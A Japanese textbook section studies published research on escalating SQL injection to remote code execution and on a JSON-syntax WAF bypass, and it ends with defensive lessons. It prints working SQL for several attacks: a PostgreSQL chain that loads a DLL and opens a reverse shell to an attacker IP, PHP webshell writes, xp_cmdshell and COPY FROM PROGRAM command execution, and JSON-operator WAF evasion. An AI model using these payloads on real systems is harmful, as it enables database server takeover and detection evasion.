## PostgreSQL RCEとJSON WAFバイパス原典研究

SQLインジェクション（SQLi）は「データベースの中身を読み書きできる」で終わる脆弱性だと思われがちだが、DBMSは単なるデータ保管庫ではない。ファイルシステムへの読み書き、OSコマンドの起動、ネイティブコード（共有ライブラリ）のロードといった強力な機能を内部に持っており、条件が揃えばSQLiは**RCE（Remote Code Execution、リモートコード実行）**――攻撃者が標的サーバ上で任意のコマンドを実行できる最終段階――に直結する。

本節では、この「SQLi→RCE」の到達点として名高い2つの原典研究を精読する。1つはSteven Seeley（mr_me）による PostgreSQL の "Double Uppercut"（large object と `CREATE FUNCTION` のディレクトリトラバーサルを組み合わせた RCE）。もう1つは Claroty Team82 による "{JS-ON: Security-OFF}"（JSON構文を使って主要5ベンダーのWAFを一斉にすり抜けた研究）である。前者は「SQLiがどこまで昇格しうるか」の上限を、後者は「その攻撃をどうやって検知の目から隠すか」の最前線を示す。あわせて、DBMS横断でSQLi→RCEの主要技法を俯瞰する。

---

### 1. Double Uppercut：PostgreSQLでSQLiからRCEを取る

#### 前提条件と全体像

Steven Seeley（Source Incite）が2020年に公開した "SQL Injection Double Uppercut" は、認証済みのSQLiを起点に PostgreSQL 上で任意のネイティブコードを実行する手法である。成立には次の3つが必要になる。

- **DB スーパーユーザ権限**（`pg_largeobject` テーブルの直接操作と `CREATE FUNCTION ... LANGUAGE C` に必須）
- **スタッククエリ（stacked queries）**が使えること――1つの注入ポイントで `;` 区切りの複数文（`SELECT ...; UPDATE ...; CREATE FUNCTION ...`）を連続実行できること
- 標的の PostgreSQL の**バージョンとアーキテクチャに一致する共有ライブラリ**（Windowsなら `.dll`、Unixなら `.so`）を攻撃者側でコンパイルできること

> ⚠️ 用語補足: **large object（ラージオブジェクト、LO）** とは、PostgreSQL がBLOB的な巨大バイナリを扱うための仕組みで、実データはシステムテーブル `pg_largeobject` に「2048バイトごとのページ（`pageno`）」に分割されて格納される。`lo_import` / `lo_export` はサーバのファイルシステムとLOの間でデータをやり取りする関数で、いずれもスーパーユーザ権限を要する。**sink（入力が最終的に実行・解釈される危険な着地点）** はここでは「ディスクに書き出された共有ライブラリ」であり、それを `CREATE FUNCTION` でプロセスにロードさせるのが核心になる。

狙いは明快で、「(1) 攻撃者が用意した悪意ある共有ライブラリを PostgreSQL のデータディレクトリに書き込み、(2) `CREATE FUNCTION` でそれをロードして関数化し、(3) その関数を呼んでコードを実行させる」という3幕構成である。難所は (1) の「どこに書けるか」と (2) の「どこからロードできるか」を一致させる点にある。

#### 攻撃パイプライン（原典のSQLをそのまま追う）

**ステージ1：large object のエントリを作る**

```sql
select lo_import('C:/Windows/win.ini', 1337);
```

`lo_import` で既存の適当なファイル（ここでは `win.ini`）を読み込み、OID（オブジェクトID）`1337` を明示指定して `pg_largeobject` にLOエントリを作る。中身は後で全部上書きするので、この段階では「1337番のLOという入れ物を確保する」ことだけが目的である。

**ステージ2：LOの中身を悪意あるバイナリで上書きする**

```sql
update pg_largeobject SET pageno=0, data=decode('4d5a90...', 'hex') where loid=1337;
insert into pg_largeobject(loid, pageno, data) values (1337, 1, decode('74114d...', 'hex'));
```

コンパイル済みの共有ライブラリ（`4d5a...` は Windows PE の `MZ` シグネチャ）を16進エンコードし、`decode(..., 'hex')` でバイナリに戻して `data` 列に書き込む。ファイルが 2048 バイトを超える場合は、`pageno` を 0, 1, 2... と増やしながらページ単位で分割挿入する。**なぜページ分割が要るのか**：`pg_largeobject` の1行は仕様上1ページ（既定 2KB）までしか保持できないためで、大きなDLL/SOは必然的に複数行にまたがる。

**ステージ3：LOをファイルとして書き出す**

```sql
select lo_export(1337, 'poc.dll');
```

`lo_export` で1337番LOをファイル `poc.dll` に書き出す。相対パスで指定するとPostgreSQLの**データディレクトリ**に落ちる。ここが重要で、データディレクトリはPostgreSQLサービスアカウントが確実に書き込める場所であり、かつ次のステージで相対パス参照の起点になる。

**ステージ4：`CREATE FUNCTION` のディレクトリトラバーサルでロードする**

```sql
create function connect_back(text, integer) returns void
as '../data/poc', 'connect_back' language C strict;
```

これが "Double Uppercut" の決め手である。`CREATE FUNCTION ... AS '<ライブラリパス>', '<シンボル名>' LANGUAGE C` は、指定した共有ライブラリをサーバプロセスにロードし、その中の C 関数 `connect_back` をSQL関数として登録する。

**なぜ `../data/poc` なのか（原理）**：新しめの PostgreSQL では、`CREATE FUNCTION` に絶対パスや `$libdir` 外の任意パスを直接渡す経路が塞がれ、ライブラリは既定のライブラリディレクトリ（`.../lib` 配下）から解決されるよう制限された。しかし PostgreSQL はパス文字列を**そのまま相対パスとして解決する**ため、ライブラリディレクトリを起点に `../data/` へ**ディレクトリトラバーサル**すれば、ステージ3で書き込んだデータディレクトリ内の `poc` に到達できる。拡張子（`.dll`/`.so`）はPostgreSQLが自動付与するのでパスには書かない。つまり「書ける場所（data）」と「ロードの起点（lib）」の相対位置関係を突いて、制限を迂回している。これが旧バージョンの「UNCパス直接指定」を塞いだ修正をさらに回避する第2撃であり、名前の由来（ダブル＝2段の連打）でもある。

**ステージ5：実行**

```sql
select connect_back('192.168.100.54', 1234);
```

登録した関数を呼ぶだけで、ライブラリ内のネイティブコードがPostgreSQLプロセスの権限で走る。この例では攻撃者ホスト `192.168.100.54:1234` へリバースシェルを張る。実行コンテキストは Windows では `NETWORK SERVICE`、Unix では `postgres` ユーザとなる。

**後始末（痕跡消去）**

```sql
SELECT lo_unlink(l.oid) FROM pg_largeobject_metadata l;
DROP FUNCTION connect_back(text, integer);
```

作成したLOと関数を削除して痕跡を減らす。

#### バージョン・分類・関連手法

- **対象**：近代の PostgreSQL（記事では 12 系まで検証）。Windows・Unix いずれも対象。9.x 系では固定UNCパスによるロードが可能だったが、その経路が塞がれた後でも本手法（相対トラバーサル）は有効であった。
- **CVE / 深刻度**：ベンダー（PostgreSQL）はこれを「仕様（feature）」と分類しCVEは付与されていない。記事はCVSS 4.1（`AV:N/AC:H/PR:H/UI:N/S:U/C:L/I:L/A:L`）と評価している。高権限（スーパーユーザ）を前提とするため、評価上は「機能の悪用」の範囲に留まる点に注意。
- **関連する別経路**（記事が言及）：
  - **Jacob Wilkin** の `COPY FROM PROGRAM` を使う手法（後述。より単純だがPostgreSQL 9.3以降の機能に依存）。
  - **Denis Andzakovic** の `postgresql.conf` 改変によるUnix限定手法（スタッククエリ不要という利点がある）。

**この研究の教訓**：スーパーユーザで動くDBは「OSに片足を突っ込んだプロセス」であり、LO・`CREATE FUNCTION`・ファイル入出力といった正規機能の組み合わせだけで、単一のバグに頼らずRCEへ到達できる。防御は「アプリ用DBユーザに絶対にスーパーユーザ権限を与えない」「`pg_largeobject` や `CREATE FUNCTION` を一般ロールから剥奪する」に尽きる。

> 出典: SQL Injection Double Uppercut: How To Achieve Remote Code Execution Against PostgreSQL — https://srcincite.io/blog/2020/06/26/sql-injection-double-uppercut-how-to-achieve-remote-code-execution-against-postgresql.html

---

### 2. DBMS横断で見る SQLi→RCE の主要技法

Double Uppercut は PostgreSQL に特化した精緻な例だが、「SQLi→RCE」はDBMSごとに定石がある。ここでは各DBMSでの代表的な到達経路を、前提条件（何の権限・設定が要るか）とともに整理する。RCEの多くは、①**ファイル書き込み**でWebシェルを置く、②**OSコマンド実行機能**を直接叩く、の2系統に大別できる。

#### MySQL / MariaDB

**`INTO OUTFILE` によるWebシェル設置**（要 `FILE` 権限、`secure_file_priv` が書込先を許容していること）

```sql
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
```

クエリ結果をサーバのファイルに書き出す機能を悪用し、Web公開ディレクトリにPHPのWebシェルを設置する。あとは `http://target/shell.php?cmd=whoami` で任意コマンドを実行できる。**なぜ成立するか**：`INTO OUTFILE` はDBプロセスの権限でファイルを新規作成する正規機能であり、書き込み先がWebサーバの配信対象なら「DB経由でPHPを植える」だけでコードが実行環境に載る。

**`LOAD_FILE()` によるファイル読み出し**（直接のRCEではなく、鍵ファイルや設定を読み取って昇格の足がかりにする）

```sql
SELECT LOAD_FILE('/etc/passwd');
```

#### Microsoft SQL Server（MSSQL）

**`xp_cmdshell`**：MSSQLの拡張ストアドプロシージャで、OSコマンドを直接実行する。既定で無効なので、まず有効化する必要がある。

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

**`sp_OACreate`（OLE Automation）**：COMオブジェクトを生成してコマンドを起動する。`xp_cmdshell` が監視・無効化されている環境での代替手段。

```sql
DECLARE @shell INT;
EXEC sp_OACreate 'WScript.Shell', @shell OUTPUT;
EXEC sp_OAMethod @shell, 'Run', NULL, 'cmd.exe /c whoami';
```

**リンクサーバ経由の実行**：他のSQL Serverへのリンク設定があれば、`AT` 句でリモート側の `xp_cmdshell` を呼べる。

```sql
EXEC('master..xp_cmdshell ''whoami''') AT [linked_server_name];
```

#### PostgreSQL

**`COPY ... TO/FROM`**（ファイル読み書き。Double Uppercut のLOと同じく高権限を要する）

```sql
COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php';
```

**`COPY ... FROM PROGRAM`**（PostgreSQL 9.3以降。OSコマンドの標準出力をテーブルに取り込む＝実質的なコマンド実行）

```sql
COPY test_table FROM PROGRAM 'id';
```

**なぜ `COPY FROM PROGRAM` がRCEになるか**：本来は「外部プログラムの出力をインポートする」機能だが、`PROGRAM` に渡した文字列はサーバ上でシェル実行されるため、`id` でも `bash -c '...'` でも任意コマンドが走る。前掲の Double Uppercut（LO＋`CREATE FUNCTION`）はこの経路が塞がれている／ネイティブコード実行が欲しい場合の、より低レベルな代替と位置づけられる。

**UDF（ユーザ定義関数）**：`LANGUAGE C` で共有ライブラリの関数を登録する経路で、Double Uppercut がまさにこれを悪用している。

> ⚠️ **未取得の資料**: 元資料には Oracle の手法（`DBMS_SCHEDULER`、Java stored procedure、`UTL_FILE` など）への言及がありませんでした。Oracle でのSQLi→RCEに関しては、ご自身で追加調査されることをお勧めします。（以下は一般知識に基づく補足）Oracleでは `DBMS_SCHEDULER` や `DBMS_JAVA`、外部テーブルの `PREPROCESSOR` 句などが古典的なコマンド実行経路として知られており、いずれも高い権限を要する。

**横断的な教訓**：どのDBMSでも、RCEに至る経路は「①WebルートへのファイルWRITE」または「②DBが提供するコマンド/コード実行機能」のいずれかに帰着し、そのすべてが**高い権限（FILE権限・スーパーユーザ・sysadmin等）を前提**とする。したがって最も効くのは「アプリが使うDBアカウントを最小権限に絞る」ことである。

> 出典: SQL Injection to RCE — https://sallam.gitbook.io/sec-88/web-appsec/sql-injection/sql-to-rce

---

### 3. {JS-ON: Security-OFF}：JSON構文による主要WAF一斉バイパス

前節までの攻撃は「どうやってDBを深く突くか」の話だった。実運用では、その手前に**WAF（Web Application Firewall）**が立ちはだかる。Claroty Team82 の Noam Moshe が 2022年12月8日 に公開した "{JS-ON: Security-OFF}" は、**JSON構文**という一手で主要5ベンダーのWAFを軒並みすり抜けた原典研究であり、WAFバイパスの本質（パーサ差分）を最も鮮やかに示した事例として知られる。

#### 影響を受けたベンダーと発見の経緯

回避に成功したWAFは次の5つ：

- **Palo Alto Networks**（Next-Generation Firewall）
- **Amazon Web Services**（AWS ELB/WAF）
- **Cloudflare**
- **F5**（BIG-IP）
- **Imperva**

一方、Check Point の CloudGuard AppSec と open-appsec は当初からこの攻撃を検知できていた（免疫があった）。

きっかけは、Cambium Networks の cnMaestro プラットフォームの脆弱性 **CVE-2022-1361** の調査だった。そこでは「開発者がプリペアドステートメント（パラメータ化クエリ）を使っていなかった」ためSQLiが成立していた。研究者はこのSQLiを実際のWAF越しに通せるかを検証する過程で、JSON構文がWAF検知の共通の盲点になっていることを発見した。

#### なぜWAFはすり抜けられたのか（原理＝パーサ差分）

WAFがSQLiを検知する方法は大きく2つある。

1. **ブラックリスト（キーワード検知）**：`union select`、`or 1=1`、`sleep(` などの危険な文字列にマッチさせる。
2. **SQL構文の部分解析**：受け取った文字列を「SQLとして」解析し、injectionらしい構造かを判定する。

問題は、**「すべての主要RDBMS（MSSQL・PostgreSQL・SQLite・MySQL）が10年近く前からネイティブにJSON構文をサポートしている」のに、WAFベンダーはそのJSON構文の解析を実装してこなかった**という非対称性にあった。研究者はこれを「WAFのパーサとデータベースエンジンの間のミスマッチ（parser differential）そのものが JSON だった」と表現している。

**具体的な破綻の仕方**：WAFの構文解析器にJSON演算子（後述の `@>` `<@` `->` `#>` など）を含んだ文字列を食わせると、WAFは**それを正当なSQLとして解釈できずに構文解析でつまずく**。多くのWAFは「解析に失敗した＝おそらく無害な文字列」と扱う（あるいは危険構造として認識できない）ため、ペイロード全体を**通してしまう**。ところがバックエンドのDBは同じ文字列をJSON演算を含む正しいSQLとして完璧に解釈し、注入が成立する。つまり「WAFには読めず、DBには読める」構文を先頭に置くことで、検知の目を潰している。これは本教科書で繰り返し出てくる「WAFはSQLパーサそのものではない」という原理の、最も強力な実例である。

#### 悪用に使われたJSON演算子と実例

各DBがサポートするJSON構文の例（いずれもWAFのシグネチャ・構文解析を混乱させた）：

**PostgreSQL（`<@` = 包含（containment）判定）**

```sql
'{"b":2}'::jsonb <@ '{"a":1, "b":2}'::jsonb
```

`<@` は「左のJSONが右のJSONに含まれるか」を判定する演算子で、この式は PostgreSQL 上で真（true）に評価される。これをSQLiペイロードの先頭に前置すると、WAFのSQLパーサは `::jsonb` や `<@` を解釈できずに解析を放棄する一方、DBは正しく評価してペイロードの後続部分を実行する。`@>`（包含の向き逆）、`?`/`?|`/`?&`（キー存在判定）、`#>`/`#>>`（パス取得）、`->`/`->>`（要素取得）など、PostgreSQLのJSONB演算子群が同様に利用できる。

**SQLite（`->` = JSONパス抽出）**

```sql
'{"a":2,"c":[4,5,{"f":7}]}' -> '$.c[2].f' = 7
```

JSONパス `$.c[2].f` で値 `7` を取り出し比較する式。これも真に評価される。

**MySQL（`JSON_EXTRACT` 関数）**

```sql
JSON_EXTRACT('{"id": 14, "name": "Aztalan"}', '$.name') = 'Aztalan'
```

`JSON_EXTRACT` でキー `name` の値を取り出して比較する。演算子記法（`->`）ではなく関数形式だが、WAFのブラックリストにJSON関数が載っていない点を突く発想は同じである。

> ⚠️ **一部未取得**: 記事内で cnMaestro（CVE-2022-1361）に対して実際に送信された「WAFにブロックされる素のペイロード」と「JSON前置で通った最終ペイロード」の完全な対応文字列は、自動取得したテキストからは特定できませんでした。原典の該当スクリーンショット・ペイロードは以下から直接ご確認ください: https://claroty.com/team82/research/js-on-security-off-abusing-json-based-sql-to-bypass-waf （以下は未取得部分の補足として一般知識に基づく解説です）実務上の典型は、`' OR 1=1 --` のような素のブール注入がWAFに弾かれる場合に、前置または内部に `'{"a":"b"}'::jsonb @> '{"a":"b"}'` のようなJSON式を織り込み、WAFの構文解析を破綻させつつDBには真を返させる、という組み立てである。

#### 影響とツール化

研究チームは発見した手法を**SQLMap**（自動SQLi攻撃ツール）に統合し、JSONバイパスを含むペイロードでWAF保護下の標的を自動攻撃できることを実証した。これにより、この手法は個別の職人技ではなく「誰でも自動化して撃てる」現実的な脅威となった。各WAFベンダーはその後JSON構文への対応（署名追加・パーサ拡張）を進めたが、この研究は「WAFの検知は本質的にDBパーサの後追いであり、DBが受理する新構文は常に検知の穴になりうる」という教訓を残した。

**時事性の注記**：本手法は2022年12月時点で有効だったもので、報告後に主要ベンダーは順次シグネチャを更新している。したがって「今すぐ全WAFに効く魔法」ではないが、①WAFに依存した防御の限界を示す原理的な事例として、②新しいDB構文（JSON以外にも将来登場しうる）が同じ穴を再生産しうるという警告として、今なお価値がある。

> 出典: {JS-ON: Security-OFF}: Abusing JSON-Based SQL to Bypass WAF — https://claroty.com/team82/research/js-on-security-off-abusing-json-based-sql-to-bypass-waf

---

### まとめ

本節の3資料は、SQLiの「攻め」と「隠し」の両極を示している。

- **Double Uppercut** は、PostgreSQLの正規機能（large object＋`CREATE FUNCTION`）だけを組み合わせ、`../data/` への相対トラバーサルという一点でロード制限を破ってRCEに到達する。単一の実装バグではなく「機能の合成」で最終目的を達する好例であり、防御の要は**DBアカウントの最小権限化**に尽きる。
- **DBMS横断のSQLi→RCE** は、①WebルートへのファイルWRITE、②DB内蔵のコマンド/コード実行機能、という2系統に整理でき、いずれも高権限を前提とする。攻撃面を減らす鍵はやはり権限設計にある。
- **{JS-ON: Security-OFF}** は、WAFとDBの「パーサ差分」を JSON という具体で突き、主要5ベンダーを一斉に破った。これは「WAFはSQLパーサそのものではない」という本教科書共通の原理の決定版であり、**根本防御はプレースホルダ（パラメータ化クエリ）による構文とデータの完全分離**であって、WAFはあくまで多層防御の一層に過ぎないことを再確認させる。
